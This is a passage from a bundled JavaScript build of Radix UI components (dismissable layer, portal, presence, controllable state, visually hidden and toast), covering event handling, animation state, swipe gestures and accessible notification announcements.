  return /* @__PURE__ */ jsx7(Primitive.div, { ...props, ref: composedRefs });
});
DismissableLayerBranch.displayName = BRANCH_NAME;
function usePointerDownOutside(onPointerDownOutside, ownerDocument = globalThis?.document) {
  const handlePointerDownOutside = useCallbackRef(onPointerDownOutside);
  const isPointerInsideReactTreeRef = React16.useRef(false);
  const handleClickRef = React16.useRef(() => {
  });
  React16.useEffect(() => {
    const handlePointerDown = (event) => {
      if (event.target && !isPointerInsideReactTreeRef.current) {
        let handleAndDispatchPointerDownOutsideEvent2 = function() {
          handleAndDispatchCustomEvent(
            POINTER_DOWN_OUTSIDE,
            handlePointerDownOutside,
            eventDetail,
            { discrete: true }
          );
        };
        var handleAndDispatchPointerDownOutsideEvent = handleAndDispatchPointerDownOutsideEvent2;
        const eventDetail = { originalEvent: event };
        if (event.pointerType === "touch") {
          ownerDocument.removeEventListener("click", handleClickRef.current);
          handleClickRef.current = handleAndDispatchPointerDownOutsideEvent2;
          ownerDocument.addEventListener("click", handleClickRef.current, { once: true });
        } else {
          handleAndDispatchPointerDownOutsideEvent2();
        }
      } else {
        ownerDocument.removeEventListener("click", handleClickRef.current);
      }
      isPointerInsideReactTreeRef.current = false;
    };
    const timerId = window.setTimeout(() => {
      ownerDocument.addEventListener("pointerdown", handlePointerDown);
    }, 0);
    return () => {
      window.clearTimeout(timerId);
      ownerDocument.removeEventListener("pointerdown", handlePointerDown);
      ownerDocument.removeEventListener("click", handleClickRef.current);
    };
  }, [ownerDocument, handlePointerDownOutside]);
  return {
    // ensures we check React component tree (not just DOM tree)
    onPointerDownCapture: () => isPointerInsideReactTreeRef.current = true
  };
}
function useFocusOutside(onFocusOutside, ownerDocument = globalThis?.document) {
  const handleFocusOutside = useCallbackRef(onFocusOutside);
  const isFocusInsideReactTreeRef = React16.useRef(false);
  React16.useEffect(() => {
    const handleFocus = (event) => {
      if (event.target && !isFocusInsideReactTreeRef.current) {
        const eventDetail = { originalEvent: event };
        handleAndDispatchCustomEvent(FOCUS_OUTSIDE, handleFocusOutside, eventDetail, {
          discrete: false
        });
      }
    };
    ownerDocument.addEventListener("focusin", handleFocus);
    return () => ownerDocument.removeEventListener("focusin", handleFocus);
  }, [ownerDocument, handleFocusOutside]);
  return {
    onFocusCapture: () => isFocusInsideReactTreeRef.current = true,
    onBlurCapture: () => isFocusInsideReactTreeRef.current = false
  };
}
function dispatchUpdate() {
  const event = new CustomEvent(CONTEXT_UPDATE);
  document.dispatchEvent(event);
}
function handleAndDispatchCustomEvent(name, handler, detail, { discrete }) {
  const target = detail.originalEvent.target;
  const event = new CustomEvent(name, { bubbles: false, cancelable: true, detail });
  if (handler) target.addEventListener(name, handler, { once: true });
  if (discrete) {
    dispatchDiscreteCustomEvent(target, event);
  } else {
    target.dispatchEvent(event);
  }
}
var Root = DismissableLayer;
var Branch = DismissableLayerBranch;

// node_modules/@radix-ui/react-portal/dist/index.mjs
import * as React18 from "react";
import ReactDOM2 from "react-dom";

// node_modules/@radix-ui/react-use-layout-effect/dist/index.mjs
import * as React17 from "react";
var useLayoutEffect22 = globalThis?.document ? React17.useLayoutEffect : () => {
};

// node_modules/@radix-ui/react-portal/dist/index.mjs
import { jsx as jsx8 } from "react/jsx-runtime";
var PORTAL_NAME = "Portal";
var Portal = React18.forwardRef((props, forwardedRef) => {
  const { container: containerProp, ...portalProps } = props;
  const [mounted, setMounted] = React18.useState(false);
  useLayoutEffect22(() => setMounted(true), []);
  const container = containerProp || mounted && globalThis?.document?.body;
  return container ? ReactDOM2.createPortal(/* @__PURE__ */ jsx8(Primitive.div, { ...portalProps, ref: forwardedRef }), container) : null;
});
Portal.displayName = PORTAL_NAME;

// node_modules/@radix-ui/react-presence/dist/index.mjs
import * as React23 from "react";
import * as React19 from "react";
function useStateMachine(initialState, machine) {
  return React19.useReducer((state, event) => {
    const nextState = machine[state][event];
    return nextState ?? state;
  }, initialState);
}
var Presence = (props) => {
  const { present, children } = props;
  const presence = usePresence(present);
  const child = typeof children === "function" ? children({ present: presence.isPresent }) : React23.Children.only(children);
  const ref = useComposedRefs(presence.ref, getElementRef2(child));
  const forceMount = typeof children === "function";
  return forceMount || presence.isPresent ? React23.cloneElement(child, { ref }) : null;
};
Presence.displayName = "Presence";
function usePresence(present) {
  const [node, setNode] = React23.useState();
  const stylesRef = React23.useRef(null);
  const prevPresentRef = React23.useRef(present);
  const prevAnimationNameRef = React23.useRef("none");
  const initialState = present ? "mounted" : "unmounted";
  const [state, send] = useStateMachine(initialState, {
    mounted: {
      UNMOUNT: "unmounted",
      ANIMATION_OUT: "unmountSuspended"
    },
    unmountSuspended: {
      MOUNT: "mounted",
      ANIMATION_END: "unmounted"
    },
    unmounted: {
      MOUNT: "mounted"
    }
  });
  React23.useEffect(() => {
    const currentAnimationName = getAnimationName(stylesRef.current);
    prevAnimationNameRef.current = state === "mounted" ? currentAnimationName : "none";
  }, [state]);
  useLayoutEffect22(() => {
    const styles = stylesRef.current;
    const wasPresent = prevPresentRef.current;
    const hasPresentChanged = wasPresent !== present;
    if (hasPresentChanged) {
      const prevAnimationName = prevAnimationNameRef.current;
      const currentAnimationName = getAnimationName(styles);
      if (present) {
        send("MOUNT");
      } else if (currentAnimationName === "none" || styles?.display === "none") {
        send("UNMOUNT");
      } else {
        const isAnimating = prevAnimationName !== currentAnimationName;
        if (wasPresent && isAnimating) {
          send("ANIMATION_OUT");
        } else {
          send("UNMOUNT");
        }
      }
      prevPresentRef.current = present;
    }
  }, [present, send]);
  useLayoutEffect22(() => {
    if (node) {
      let timeoutId;
      const ownerWindow = node.ownerDocument.defaultView ?? window;
      const handleAnimationEnd = (event) => {
        const currentAnimationName = getAnimationName(stylesRef.current);
        const isCurrentAnimation = currentAnimationName.includes(event.animationName);
        if (event.target === node && isCurrentAnimation) {
          send("ANIMATION_END");
          if (!prevPresentRef.current) {
            const currentFillMode = node.style.animationFillMode;
            node.style.animationFillMode = "forwards";
            timeoutId = ownerWindow.setTimeout(() => {
              if (node.style.animationFillMode === "forwards") {
                node.style.animationFillMode = currentFillMode;
              }
            });
          }
        }
      };
      const handleAnimationStart = (event) => {
        if (event.target === node) {
          prevAnimationNameRef.current = getAnimationName(stylesRef.current);
        }
      };
      node.addEventListener("animationstart", handleAnimationStart);
      node.addEventListener("animationcancel", handleAnimationEnd);
      node.addEventListener("animationend", handleAnimationEnd);
      return () => {
        ownerWindow.clearTimeout(timeoutId);
        node.removeEventListener("animationstart", handleAnimationStart);
        node.removeEventListener("animationcancel", handleAnimationEnd);
        node.removeEventListener("animationend", handleAnimationEnd);
      };
    } else {
      send("ANIMATION_END");
    }
  }, [node, send]);
  return {
    isPresent: ["mounted", "unmountSuspended"].includes(state),
    ref: React23.useCallback((node2) => {
      stylesRef.current = node2 ? getComputedStyle(node2) : null;
      setNode(node2);
    }, [])
  };
}
function getAnimationName(styles) {
  return styles?.animationName || "none";
}
function getElementRef2(element) {
  let getter = Object.getOwnPropertyDescriptor(element.props, "ref")?.get;
  let mayWarn = getter && "isReactWarning" in getter && getter.isReactWarning;
  if (mayWarn) {
    return element.ref;
  }
  getter = Object.getOwnPropertyDescriptor(element, "ref")?.get;
  mayWarn = getter && "isReactWarning" in getter && getter.isReactWarning;
  if (mayWarn) {
    return element.props.ref;
  }
  return element.props.ref || element.ref;
}

// node_modules/@radix-ui/react-use-controllable-state/dist/index.mjs
import * as React20 from "react";
import * as React24 from "react";
var useInsertionEffect3 = React20[" useInsertionEffect ".trim().toString()] || useLayoutEffect22;
function useControllableState({
  prop,
  defaultProp,
  onChange = () => {
  },
  caller
}) {
  const [uncontrolledProp, setUncontrolledProp, onChangeRef] = useUncontrolledState({
    defaultProp,
    onChange
  });
  const isControlled = prop !== void 0;
  const value = isControlled ? prop : uncontrolledProp;
  if (true) {
    const isControlledRef = React20.useRef(prop !== void 0);
    React20.useEffect(() => {
      const wasControlled = isControlledRef.current;
      if (wasControlled !== isControlled) {
        const from = wasControlled ? "controlled" : "uncontrolled";
        const to = isControlled ? "controlled" : "uncontrolled";
        console.warn(
          `${caller} is changing from ${from} to ${to}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`
        );
      }
      isControlledRef.current = isControlled;
    }, [isControlled, caller]);
  }
  const setValue = React20.useCallback(
    (nextValue) => {
      if (isControlled) {
        const value2 = isFunction(nextValue) ? nextValue(prop) : nextValue;
        if (value2 !== prop) {
          onChangeRef.current?.(value2);
        }
      } else {
        setUncontrolledProp(nextValue);
      }
    },
    [isControlled, prop, setUncontrolledProp, onChangeRef]
  );
  return [value, setValue];
}
function useUncontrolledState({
  defaultProp,
  onChange
}) {
  const [value, setValue] = React20.useState(defaultProp);
  const prevValueRef = React20.useRef(value);
  const onChangeRef = React20.useRef(onChange);
  useInsertionEffect3(() => {
    onChangeRef.current = onChange;
  }, [onChange]);
  React20.useEffect(() => {
    if (prevValueRef.current !== value) {
      onChangeRef.current?.(value);
      prevValueRef.current = value;
    }
  }, [value, prevValueRef]);
  return [value, setValue, onChangeRef];
}
function isFunction(value) {
  return typeof value === "function";
}
var SYNC_STATE = Symbol("RADIX:SYNC_STATE");

// node_modules/@radix-ui/react-visually-hidden/dist/index.mjs
import * as React21 from "react";
import { jsx as jsx9 } from "react/jsx-runtime";
var VISUALLY_HIDDEN_STYLES = Object.freeze({
  // See: https://github.com/twbs/bootstrap/blob/main/scss/mixins/_visually-hidden.scss
  position: "absolute",
  border: 0,
  width: 1,
  height: 1,
  padding: 0,
  margin: -1,
  overflow: "hidden",
  clip: "rect(0, 0, 0, 0)",
  whiteSpace: "nowrap",
  wordWrap: "normal"
});
var NAME = "VisuallyHidden";
var VisuallyHidden = React21.forwardRef(
  (props, forwardedRef) => {
    return /* @__PURE__ */ jsx9(
      Primitive.span,
      {
        ...props,
        ref: forwardedRef,
        style: { ...VISUALLY_HIDDEN_STYLES, ...props.style }
      }
    );
  }
);
VisuallyHidden.displayName = NAME;
var Root2 = VisuallyHidden;

// node_modules/@radix-ui/react-toast/dist/index.mjs
import { Fragment as Fragment3, jsx as jsx10, jsxs } from "react/jsx-runtime";
var PROVIDER_NAME = "ToastProvider";
var [Collection, useCollection, createCollectionScope] = createCollection("Toast");
var [createToastContext, createToastScope] = createContextScope("Toast", [createCollectionScope]);
var [ToastProviderProvider, useToastProviderContext] = createToastContext(PROVIDER_NAME);
var ToastProvider = (props) => {
  const {
    __scopeToast,
    label = "Notification",
    duration = 5e3,
    swipeDirection = "right",
    swipeThreshold = 50,
    children
  } = props;
  const [viewport, setViewport] = React25.useState(null);
  const [toastCount, setToastCount] = React25.useState(0);
  const isFocusedToastEscapeKeyDownRef = React25.useRef(false);
  const isClosePausedRef = React25.useRef(false);
  if (!label.trim()) {
    console.error(
      `Invalid prop \`label\` supplied to \`${PROVIDER_NAME}\`. Expected non-empty \`string\`.`
    );
  }
  return /* @__PURE__ */ jsx10(Collection.Provider, { scope: __scopeToast, children: /* @__PURE__ */ jsx10(
    ToastProviderProvider,
    {
      scope: __scopeToast,
      label,
      duration,
      swipeDirection,
      swipeThreshold,
      toastCount,
      viewport,
      onViewportChange: setViewport,
      onToastAdd: React25.useCallback(() => setToastCount((prevCount) => prevCount + 1), []),
      onToastRemove: React25.useCallback(() => setToastCount((prevCount) => prevCount - 1), []),
      isFocusedToastEscapeKeyDownRef,
      isClosePausedRef,
      children
    }
  ) });
};
ToastProvider.displayName = PROVIDER_NAME;
var VIEWPORT_NAME = "ToastViewport";
var VIEWPORT_DEFAULT_HOTKEY = ["F8"];
var VIEWPORT_PAUSE = "toast.viewportPause";
var VIEWPORT_RESUME = "toast.viewportResume";
var ToastViewport = React25.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeToast,
      hotkey = VIEWPORT_DEFAULT_HOTKEY,
      label = "Notifications ({hotkey})",
      ...viewportProps
    } = props;
    const context = useToastProviderContext(VIEWPORT_NAME, __scopeToast);
    const getItems = useCollection(__scopeToast);
    const wrapperRef = React25.useRef(null);
    const headFocusProxyRef = React25.useRef(null);
    const tailFocusProxyRef = React25.useRef(null);
    const ref = React25.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, ref, context.onViewportChange);
    const hotkeyLabel = hotkey.join("+").replace(/Key/g, "").replace(/Digit/g, "");
    const hasToasts = context.toastCount > 0;
    React25.useEffect(() => {
      const handleKeyDown = (event) => {
        const isHotkeyPressed = hotkey.length !== 0 && hotkey.every((key) => event[key] || event.code === key);
        if (isHotkeyPressed) ref.current?.focus();
      };
      document.addEventListener("keydown", handleKeyDown);
      return () => document.removeEventListener("keydown", handleKeyDown);
    }, [hotkey]);
    React25.useEffect(() => {
      const wrapper = wrapperRef.current;
      const viewport = ref.current;
      if (hasToasts && wrapper && viewport) {
        const handlePause = () => {
          if (!context.isClosePausedRef.current) {
            const pauseEvent = new CustomEvent(VIEWPORT_PAUSE);
            viewport.dispatchEvent(pauseEvent);
            context.isClosePausedRef.current = true;
          }
        };
        const handleResume = () => {
          if (context.isClosePausedRef.current) {
            const resumeEvent = new CustomEvent(VIEWPORT_RESUME);
            viewport.dispatchEvent(resumeEvent);
            context.isClosePausedRef.current = false;
          }
        };
        const handleFocusOutResume = (event) => {
          const isFocusMovingOutside = !wrapper.contains(event.relatedTarget);
          if (isFocusMovingOutside) handleResume();
        };
        const handlePointerLeaveResume = () => {
          const isFocusInside = wrapper.contains(document.activeElement);
          if (!isFocusInside) handleResume();
        };
        wrapper.addEventListener("focusin", handlePause);
        wrapper.addEventListener("focusout", handleFocusOutResume);
        wrapper.addEventListener("pointermove", handlePause);
        wrapper.addEventListener("pointerleave", handlePointerLeaveResume);
        window.addEventListener("blur", handlePause);
        window.addEventListener("focus", handleResume);
        return () => {
          wrapper.removeEventListener("focusin", handlePause);
          wrapper.removeEventListener("focusout", handleFocusOutResume);
          wrapper.removeEventListener("pointermove", handlePause);
          wrapper.removeEventListener("pointerleave", handlePointerLeaveResume);
          window.removeEventListener("blur", handlePause);
          window.removeEventListener("focus", handleResume);
        };
      }
    }, [hasToasts, context.isClosePausedRef]);
    const getSortedTabbableCandidates = React25.useCallback(
      ({ tabbingDirection }) => {
        const toastItems = getItems();
        const tabbableCandidates = toastItems.map((toastItem) => {
          const toastNode = toastItem.ref.current;
          const toastTabbableCandidates = [toastNode, ...getTabbableCandidates(toastNode)];
          return tabbingDirection === "forwards" ? toastTabbableCandidates : toastTabbableCandidates.reverse();
        });
        return (tabbingDirection === "forwards" ? tabbableCandidates.reverse() : tabbableCandidates).flat();
      },
      [getItems]
    );
    React25.useEffect(() => {
      const viewport = ref.current;
      if (viewport) {
        const handleKeyDown = (event) => {
          const isMetaKey = event.altKey || event.ctrlKey || event.metaKey;
          const isTabKey = event.key === "Tab" && !isMetaKey;
          if (isTabKey) {
            const focusedElement = document.activeElement;
            const isTabbingBackwards = event.shiftKey;
            const targetIsViewport = event.target === viewport;
            if (targetIsViewport && isTabbingBackwards) {
              headFocusProxyRef.current?.focus();
              return;
            }
            const tabbingDirection = isTabbingBackwards ? "backwards" : "forwards";
            const sortedCandidates = getSortedTabbableCandidates({ tabbingDirection });
            const index2 = sortedCandidates.findIndex((candidate) => candidate === focusedElement);
            if (focusFirst(sortedCandidates.slice(index2 + 1))) {
              event.preventDefault();
            } else {
              isTabbingBackwards ? headFocusProxyRef.current?.focus() : tailFocusProxyRef.current?.focus();
            }
          }
        };
        viewport.addEventListener("keydown", handleKeyDown);
        return () => viewport.removeEventListener("keydown", handleKeyDown);
      }
    }, [getItems, getSortedTabbableCandidates]);
    return /* @__PURE__ */ jsxs(
      Branch,
      {
        ref: wrapperRef,
        role: "region",
        "aria-label": label.replace("{hotkey}", hotkeyLabel),
        tabIndex: -1,
        style: { pointerEvents: hasToasts ? void 0 : "none" },
        children: [
          hasToasts && /* @__PURE__ */ jsx10(
            FocusProxy,
            {
              ref: headFocusProxyRef,
              onFocusFromOutsideViewport: () => {
                const tabbableCandidates = getSortedTabbableCandidates({
                  tabbingDirection: "forwards"
                });
                focusFirst(tabbableCandidates);
              }
            }
          ),
          /* @__PURE__ */ jsx10(Collection.Slot, { scope: __scopeToast, children: /* @__PURE__ */ jsx10(Primitive.ol, { tabIndex: -1, ...viewportProps, ref: composedRefs }) }),
          hasToasts && /* @__PURE__ */ jsx10(
            FocusProxy,
            {
              ref: tailFocusProxyRef,
              onFocusFromOutsideViewport: () => {
                const tabbableCandidates = getSortedTabbableCandidates({
                  tabbingDirection: "backwards"
                });
                focusFirst(tabbableCandidates);
              }
            }
          )
        ]
      }
    );
  }
);
ToastViewport.displayName = VIEWPORT_NAME;
var FOCUS_PROXY_NAME = "ToastFocusProxy";
var FocusProxy = React25.forwardRef(
  (props, forwardedRef) => {
    const { __scopeToast, onFocusFromOutsideViewport, ...proxyProps } = props;
    const context = useToastProviderContext(FOCUS_PROXY_NAME, __scopeToast);
    return /* @__PURE__ */ jsx10(
      VisuallyHidden,
      {
        "aria-hidden": true,
        tabIndex: 0,
        ...proxyProps,
        ref: forwardedRef,
        style: { position: "fixed" },
        onFocus: (event) => {
          const prevFocusedElement = event.relatedTarget;
          const isFocusFromOutsideViewport = !context.viewport?.contains(prevFocusedElement);
          if (isFocusFromOutsideViewport) onFocusFromOutsideViewport();
        }
      }
    );
  }
);
FocusProxy.displayName = FOCUS_PROXY_NAME;
var TOAST_NAME = "Toast";
var TOAST_SWIPE_START = "toast.swipeStart";
var TOAST_SWIPE_MOVE = "toast.swipeMove";
var TOAST_SWIPE_CANCEL = "toast.swipeCancel";
var TOAST_SWIPE_END = "toast.swipeEnd";
var Toast = React25.forwardRef(
  (props, forwardedRef) => {
    const { forceMount, open: openProp, defaultOpen, onOpenChange, ...toastProps } = props;
    const [open, setOpen] = useControllableState({
      prop: openProp,
      defaultProp: defaultOpen ?? true,
      onChange: onOpenChange,
      caller: TOAST_NAME
    });
    return /* @__PURE__ */ jsx10(Presence, { present: forceMount || open, children: /* @__PURE__ */ jsx10(
      ToastImpl,
      {
        open,
        ...toastProps,
        ref: forwardedRef,
        onClose: () => setOpen(false),
        onPause: useCallbackRef(props.onPause),
        onResume: useCallbackRef(props.onResume),
        onSwipeStart: composeEventHandlers(props.onSwipeStart, (event) => {
          event.currentTarget.setAttribute("data-swipe", "start");
        }),
        onSwipeMove: composeEventHandlers(props.onSwipeMove, (event) => {
          const { x, y } = event.detail.delta;
          event.currentTarget.setAttribute("data-swipe", "move");
          event.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${x}px`);
          event.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${y}px`);
        }),
        onSwipeCancel: composeEventHandlers(props.onSwipeCancel, (event) => {
          event.currentTarget.setAttribute("data-swipe", "cancel");
          event.currentTarget.style.removeProperty("--radix-toast-swipe-move-x");
          event.currentTarget.style.removeProperty("--radix-toast-swipe-move-y");
          event.currentTarget.style.removeProperty("--radix-toast-swipe-end-x");
          event.currentTarget.style.removeProperty("--radix-toast-swipe-end-y");
        }),
        onSwipeEnd: composeEventHandlers(props.onSwipeEnd, (event) => {
          const { x, y } = event.detail.delta;
          event.currentTarget.setAttribute("data-swipe", "end");
          event.currentTarget.style.removeProperty("--radix-toast-swipe-move-x");
          event.currentTarget.style.removeProperty("--radix-toast-swipe-move-y");
          event.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${x}px`);
          event.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${y}px`);
          setOpen(false);
        })
      }
    ) });
  }
);
Toast.displayName = TOAST_NAME;
var [ToastInteractiveProvider, useToastInteractiveContext] = createToastContext(TOAST_NAME, {
  onClose() {
  }
});
var ToastImpl = React25.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeToast,
      type = "foreground",
      duration: durationProp,
      open,
      onClose,
      onEscapeKeyDown,
      onPause,
      onResume,
      onSwipeStart,
      onSwipeMove,
      onSwipeCancel,
      onSwipeEnd,
      ...toastProps
    } = props;
    const context = useToastProviderContext(TOAST_NAME, __scopeToast);
    const [node, setNode] = React25.useState(null);
    const composedRefs = useComposedRefs(forwardedRef, (node2) => setNode(node2));
    const pointerStartRef = React25.useRef(null);
    const swipeDeltaRef = React25.useRef(null);
    const duration = durationProp || context.duration;
    const closeTimerStartTimeRef = React25.useRef(0);
    const closeTimerRemainingTimeRef = React25.useRef(duration);
    const closeTimerRef = React25.useRef(0);
    const { onToastAdd, onToastRemove } = context;
    const handleClose = useCallbackRef(() => {
      const isFocusInToast = node?.contains(document.activeElement);
      if (isFocusInToast) context.viewport?.focus();
      onClose();
    });
    const startTimer = React25.useCallback(
      (duration2) => {
        if (!duration2 || duration2 === Infinity) return;
        window.clearTimeout(closeTimerRef.current);
        closeTimerStartTimeRef.current = (/* @__PURE__ */ new Date()).getTime();
        closeTimerRef.current = window.setTimeout(handleClose, duration2);
      },
      [handleClose]
    );
    React25.useEffect(() => {
      const viewport = context.viewport;
      if (viewport) {
        const handleResume = () => {
          startTimer(closeTimerRemainingTimeRef.current);
          onResume?.();
        };
        const handlePause = () => {
          const elapsedTime = (/* @__PURE__ */ new Date()).getTime() - closeTimerStartTimeRef.current;
          closeTimerRemainingTimeRef.current = closeTimerRemainingTimeRef.current - elapsedTime;
          window.clearTimeout(closeTimerRef.current);
          onPause?.();
        };
        viewport.addEventListener(VIEWPORT_PAUSE, handlePause);
        viewport.addEventListener(VIEWPORT_RESUME, handleResume);
        return () => {
          viewport.removeEventListener(VIEWPORT_PAUSE, handlePause);
          viewport.removeEventListener(VIEWPORT_RESUME, handleResume);
        };
      }
    }, [context.viewport, duration, onPause, onResume, startTimer]);
    React25.useEffect(() => {
      if (open && !context.isClosePausedRef.current) startTimer(duration);
    }, [open, duration, context.isClosePausedRef, startTimer]);
    React25.useEffect(() => {
      onToastAdd();
      return () => onToastRemove();
    }, [onToastAdd, onToastRemove]);
    const announceTextContent = React25.useMemo(() => {
      return node ? getAnnounceTextContent(node) : null;
    }, [node]);
    if (!context.viewport) return null;
    return /* @__PURE__ */ jsxs(Fragment3, { children: [
      announceTextContent && /* @__PURE__ */ jsx10(
        ToastAnnounce,
        {
          __scopeToast,
          role: "status",
          "aria-live": type === "foreground" ? "assertive" : "polite",
          "aria-atomic": true,
          children: announceTextContent
        }
      ),
      /* @__PURE__ */ jsx10(ToastInteractiveProvider, { scope: __scopeToast, onClose: handleClose, children: ReactDOM3.createPortal(
        /* @__PURE__ */ jsx10(Collection.ItemSlot, { scope: __scopeToast, children: /* @__PURE__ */ jsx10(
          Root,
          {
            asChild: true,
            onEscapeKeyDown: composeEventHandlers(onEscapeKeyDown, () => {
              if (!context.isFocusedToastEscapeKeyDownRef.current) handleClose();
              context.isFocusedToastEscapeKeyDownRef.current = false;
            }),
            children: /* @__PURE__ */ jsx10(
              Primitive.li,
              {
                role: "status",
                "aria-live": "off",
                "aria-atomic": true,
                tabIndex: 0,
                "data-state": open ? "open" : "closed",
                "data-swipe-direction": context.swipeDirection,
                ...toastProps,
                ref: composedRefs,
                style: { userSelect: "none", touchAction: "none", ...props.style },
                onKeyDown: composeEventHandlers(props.onKeyDown, (event) => {
                  if (event.key !== "Escape") return;
                  onEscapeKeyDown?.(event.nativeEvent);
                  if (!event.nativeEvent.defaultPrevented) {
                    context.isFocusedToastEscapeKeyDownRef.current = true;
                    handleClose();
                  }
                }),
                onPointerDown: composeEventHandlers(props.onPointerDown, (event) => {
                  if (event.button !== 0) return;
                  pointerStartRef.current = { x: event.clientX, y: event.clientY };
                }),
                onPointerMove: composeEventHandlers(props.onPointerMove, (event) => {
                  if (!pointerStartRef.current) return;
                  const x = event.clientX - pointerStartRef.current.x;
                  const y = event.clientY - pointerStartRef.current.y;
                  const hasSwipeMoveStarted = Boolean(swipeDeltaRef.current);
                  const isHorizontalSwipe = ["left", "right"].includes(context.swipeDirection);
                  const clamp3 = ["left", "up"].includes(context.swipeDirection) ? Math.min : Math.max;
                  const clampedX = isHorizontalSwipe ? clamp3(0, x) : 0;
                  const clampedY = !isHorizontalSwipe ? clamp3(0, y) : 0;
                  const moveStartBuffer = event.pointerType === "touch" ? 10 : 2;
                  const delta = { x: clampedX, y: clampedY };
                  const eventDetail = { originalEvent: event, delta };
                  if (hasSwipeMoveStarted) {
                    swipeDeltaRef.current = delta;
                    handleAndDispatchCustomEvent2(TOAST_SWIPE_MOVE, onSwipeMove, eventDetail, {
                      discrete: false
                    });
                  } else if (isDeltaInDirection(delta, context.swipeDirection, moveStartBuffer)) {
                    swipeDeltaRef.current = delta;
                    handleAndDispatchCustomEvent2(TOAST_SWIPE_START, onSwipeStart, eventDetail, {
                      discrete: false
                    });
                    event.target.setPointerCapture(event.pointerId);
                  } else if (Math.abs(x) > moveStartBuffer || Math.abs(y) > moveStartBuffer) {
                    pointerStartRef.current = null;
                  }
                }),
                onPointerUp: composeEventHandlers(props.onPointerUp, (event) => {
                  const delta = swipeDeltaRef.current;
                  const target = event.target;
                  if (target.hasPointerCapture(event.pointerId)) {
                    target.releasePointerCapture(event.pointerId);
                  }
                  swipeDeltaRef.current = null;
                  pointerStartRef.current = null;
                  if (delta) {
                    const toast2 = event.currentTarget;
                    const eventDetail = { originalEvent: event, delta };
                    if (isDeltaInDirection(delta, context.swipeDirection, context.swipeThreshold)) {
                      handleAndDispatchCustomEvent2(TOAST_SWIPE_END, onSwipeEnd, eventDetail, {
                        discrete: true
                      });
                    } else {
                      handleAndDispatchCustomEvent2(
                        TOAST_SWIPE_CANCEL,
                        onSwipeCancel,
                        eventDetail,
                        {
                          discrete: true
                        }
                      );
                    }
                    toast2.addEventListener("click", (event2) => event2.preventDefault(), {
                      once: true
                    });
                  }
                })
              }
            )
          }
        ) }),
        context.viewport
      ) })
    ] });
  }
);
var ToastAnnounce = (props) => {
  const { __scopeToast, children, ...announceProps } = props;
  const context = useToastProviderContext(TOAST_NAME, __scopeToast);
  const [renderAnnounceText, setRenderAnnounceText] = React25.useState(false);
  const [isAnnounced, setIsAnnounced] = React25.useState(false);
  useNextFrame(() => setRenderAnnounceText(true));
  React25.useEffect(() => {
    const timer = window.setTimeout(() => setIsAnnounced(true), 1e3);
    return () => window.clearTimeout(timer);
  }, []);
  return isAnnounced ? null : /* @__PURE__ */ jsx10(Portal, { asChild: true, children: /* @__PURE__ */ jsx10(VisuallyHidden, { ...announceProps, children: renderAnnounceText && /* @__PURE__ */ jsxs(Fragment3, { children: [
    context.label,
    " ",
    children
  ] }) }) });
};
var TITLE_NAME = "ToastTitle";
var ToastTitle = React25.forwardRef(
  (props, forwardedRef) => {
    const { __scopeToast, ...titleProps } = props;
    return /* @__PURE__ */ jsx10(Primitive.div, { ...titleProps, ref: forwardedRef });
  }
);
ToastTitle.displayName = TITLE_NAME;
var DESCRIPTION_NAME = "ToastDescription";
var ToastDescription = React25.forwardRef(
  (props, forwardedRef) => {
    const { __scopeToast, ...descriptionProps } = props;
    return /* @__PURE__ */ jsx10(Primitive.div, { ...descriptionProps, ref: forwardedRef });
  }
);
ToastDescription.displayName = DESCRIPTION_NAME;
var ACTION_NAME = "ToastAction";
var ToastAction = React25.forwardRef(
  (props, forwardedRef) => {
    const { altText, ...actionProps } = props;
    if (!altText.trim()) {
      console.error(
        `Invalid prop \`altText\` supplied to \`${ACTION_NAME}\`. Expected non-empty \`string\`.`
      );
      return null;
    }
    return /* @__PURE__ */ jsx10(ToastAnnounceExclude, { altText, asChild: true, children: /* @__PURE__ */ jsx10(ToastClose, { ...actionProps, ref: forwardedRef }) });
  }
);
ToastAction.displayName = ACTION_NAME;
var CLOSE_NAME = "ToastClose";
var ToastClose = React25.forwardRef(
  (props, forwardedRef) => {
    const { __scopeToast, ...closeProps } = props;
    const interactiveContext = useToastInteractiveContext(CLOSE_NAME, __scopeToast);
    return /* @__PURE__ */ jsx10(ToastAnnounceExclude, { asChild: true, children: /* @__PURE__ */ jsx10(
      Primitive.button,
      {
        type: "button",
        ...closeProps,
        ref: forwardedRef,
        onClick: composeEventHandlers(props.onClick, interactiveContext.onClose)
      }
    ) });
  }
);
ToastClose.displayName = CLOSE_NAME;
var ToastAnnounceExclude = React25.forwardRef((props, forwardedRef) => {
  const { __scopeToast, altText, ...announceExcludeProps } = props;
  return /* @__PURE__ */ jsx10(
    Primitive.div,
    {
      "data-radix-toast-announce-exclude": "",
      "data-radix-toast-announce-alt": altText || void 0,
      ...announceExcludeProps,
      ref: forwardedRef
    }
  );
});
function getAnnounceTextContent(container) {
  const textContent = [];
  const childNodes = Array.from(container.childNodes);
  childNodes.forEach((node) => {
    if (node.nodeType === node.TEXT_NODE && node.textContent) textContent.push(node.textContent);
    if (isHTMLElement(node)) {
      const isHidden2 = node.ariaHidden || node.hidden || node.style.display === "none";
      const isExcluded = node.dataset.radixToastAnnounceExclude === "";
      if (!isHidden2) {
        if (isExcluded) {
          const altText = node.dataset.radixToastAnnounceAlt;
          if (altText) textContent.push(altText);
        } else {
          textContent.push(...getAnnounceTextContent(node));
        }
      }
    }
  });
  return textContent;
}
function handleAndDispatchCustomEvent2(name, handler, detail, { discrete }) {
  const currentTarget = detail.originalEvent.currentTarget;
  const event = new CustomEvent(name, { bubbles: true, cancelable: true, detail });
  if (handler) currentTarget.addEventListener(name, handler, { once: true });
  if (discrete) {
    dispatchDiscreteCustomEvent(currentTarget, event);
  } else {
    currentTarget.dispatchEvent(event);
  }
}
var isDeltaInDirection = (delta, direction, threshold = 0) => {
  const deltaX = Math.abs(delta.x);
  const deltaY = Math.abs(delta.y);
  const isDeltaX = deltaX > deltaY;
  if (direction === "left" || direction === "right") {
    return isDeltaX && deltaX > threshold;
  } else {
    return !isDeltaX && deltaY > threshold;
  }
};
function useNextFrame(callback = () => {
}) {
  const fn = useCallbackRef(callback);
  useLayoutEffect22(() => {
